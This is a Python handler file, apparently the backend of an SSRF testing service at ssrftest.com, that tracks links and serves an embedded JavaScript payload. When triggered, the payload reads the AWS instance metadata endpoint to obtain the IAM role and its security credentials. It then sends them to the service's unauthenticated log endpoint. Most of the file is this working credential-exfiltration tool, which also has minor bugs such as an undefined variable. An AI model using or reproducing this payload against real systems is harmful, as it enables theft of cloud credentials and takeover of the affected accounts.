from handler import *

@handler('target/index')
def get_index(link):
	if link is None:
		return 'Fail'
	target = Target.one(user_id=session.user.id, link=link)
	if target is None:
		return 'Unknown link'
	return dict(
		name=target.name, 
		logs=[(log.at, log.message) for log in target.logs[::-1]], 
		hits=[(hit.at, hit.request) for hit in target.hits[::-1]]
	)

js = '''function log(data) {
	var sreq = new XMLHttpRequest();
	sreq.open('GET', 'http://ssrftest.com/target/log?link=LINK&data=' + encodeURI(data), true);
	sreq.send();
}

function get(url) {
	try {
		var req = new XMLHttpRequest();
		req.open('GET', url, false);
		req.send(null);
		if(req.status == 200)
			return req.responseText;
	} catch(err) {
            log('JS Error: ' + err);
	}
	return '';
}

log('Triggered in ' + window.location.href);
var role = get('http://169.254.169.254/latest/meta-data/iam/security-credentials/');
if(role !== null) {
	log('Fetched AWS role: ' + role);
	log('With AWS credentials: ' + get('http://169.254.169.254/latest/meta-data/iam/security-credentials/' + role));
} else
	log(inside + 'Failed to get AWS role');
'''

def hit(link, ext, req):
	if link is None:
		return 'Fail'
	target = Target.one(link=link)
	if target is None:
		return 'Unknown link'
	Hit.add(target, req)
	
	if ext == 'js':
		return Response(js.replace('LINK', link), mimetype='application/javascript')
	return Response('<script src="//ssrftest.com/x/%s.js"></script>' % link, mimetype='text/html')

@handler(authed=False)
def get_log(link, data):
	if link is None:
		return 'Fail'
	target = Target.one(link=link)
	if target is None:
		return 'Unknown link'
	Log.add(target, data)
	return ''
